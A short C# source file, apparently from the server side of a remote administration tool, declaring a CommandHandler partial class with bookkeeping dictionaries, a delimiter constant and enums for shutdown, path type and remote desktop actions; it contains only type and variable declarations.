using System.Collections.Generic;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN VARIABLES NECESSARY FOR VARIOUS COMMANDS (if needed). */
    public static partial class CommandHandler
    {
        public static Dictionary<int, string> CanceledDownloads = new Dictionary<int, string>();
        public static Dictionary<int, string> RenamedFiles = new Dictionary<int, string>();
        private static bool _isAdding = false;
        private static readonly object _isAddingLock = new object();
        private const string DELIMITER = "$E$";

        public enum UserStatus
        {
            Idle,
            Active
        }
        public enum ShutdownAction
        {
            Shutdown,
            Restart,
            Standby
        }
        public enum PathType
        {
            File,
            Directory,
            Back
        }
        public enum RemoteDesktopAction
        {
            Start,
            Stop
        }
    }
}